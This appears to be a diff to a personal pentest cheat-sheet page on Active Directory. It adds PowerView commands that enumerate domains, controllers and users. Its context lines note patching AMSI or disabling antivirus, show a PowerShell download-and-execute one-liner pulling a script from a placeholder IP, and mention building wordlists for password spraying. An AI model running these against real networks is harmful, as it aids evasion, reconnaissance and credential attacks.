@@ -10,9 +10,7 @@ permalink: /brainbox/
 # ACTIVE DIRECTORY
 
 
-### DOMAIN ENUMERATION
- # Patch AMSI or disable AV
-<span style="color: Green;"># Patch AMSI or disable AV</span>
+## DOMAIN ENUMERATION
 <span class="demo-highlight"># Patch AMSI or disable AV</span>
 
 ```powershell
@@ -20,6 +18,26 @@ permalink: /brainbox/
       iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_DeV.ps1')
 ```
  <br>
+ <span class="demo-highlight"># Get Domain & Domain Controller Information</span>
+
+```powershell
+      Get-Domain 
+      
+      
+      Get-NetDomainController
+      Get-UserProperty -Properties logoncount | where logoncount | sort logoncount -Descending
+```
+<br>
+ <span class="demo-highlight"># Get User Information</span>
+
+```powershell
+      # Get all users present in the domain
+      Get-NetUsers | select cn
+
+      # Get users sorted with most logoncounts
+      Get-UserProperty -Properties logoncount | where logoncount | sort logoncount -Descending
+```
+<br>
 <span class="demo-highlight"># Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying</span>
 
 ```powershell
@@ -37,6 +55,8 @@ Get-NetComputer
 ```powershell
 Get-NetComputer -Identity <computer_name>
 ```
+<br>
+
 
 
 ```python
